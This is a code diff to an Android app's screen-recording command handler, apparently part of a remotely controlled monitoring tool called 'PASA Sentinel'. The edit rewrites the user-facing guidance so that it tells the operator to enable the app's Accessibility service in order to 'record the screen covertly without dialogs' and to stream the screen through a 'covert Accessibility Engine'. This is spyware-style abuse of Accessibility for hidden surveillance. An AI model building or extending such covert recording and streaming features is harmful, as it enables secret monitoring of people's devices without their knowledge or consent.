@@ -105,18 +105,17 @@ class ScreenRecordCommand @Inject constructor(
         val guidance = if (isOwner) {
             "👑 <b>Device Owner is ACTIVE</b>\n" +
             "━━━━━━━━━━━━━━━━━━━━\n" +
-            "To enable FASTER on-device screen recording:\n\n" +
+            "Android SELinux policies prevent apps from invoking the system screen recorder binary directly.\n\n" +
+            "To record the screen covertly without dialogs:\n" +
             "1. Open Android <b>Settings > Accessibility</b>\n" +
-            "2. Find <b>PASA Sentinel</b> and toggle <b>ON</b>\n\n" +
-            "<i>Accessibility + Device Owner = 60 FPS hardware recording!</i>"
+            "2. Locate <b>PASA Sentinel</b> and toggle <b>ON</b>\n\n" +
+            "<i>Once enabled, PASA records and streams the screen smoothly using its covert Accessibility Engine!</i>"
         } else {
             "❌ <b>Screen Recording Unavailable</b>\n" +
             "━━━━━━━━━━━━━━━━━━━━\n\n" +
-            "✅ <b>Enable via Accessibility (15 FPS):</b>\n" +
+            "To record the screen covertly:\n" +
             "1. Open Android <b>Settings > Accessibility</b>\n" +
-            "2. Select <b>PASA Sentinel</b> and toggle <b>ON</b>\n\n" +
-            "✅ <b>Or enable Device Owner (60 FPS):</b>\n" +
-            "Run: <code>/device_owner</code> with ADB"
+            "2. Select <b>PASA Sentinel</b> and toggle <b>ON</b>"
         }
 
         return CommandResult(success = false, message = guidance)
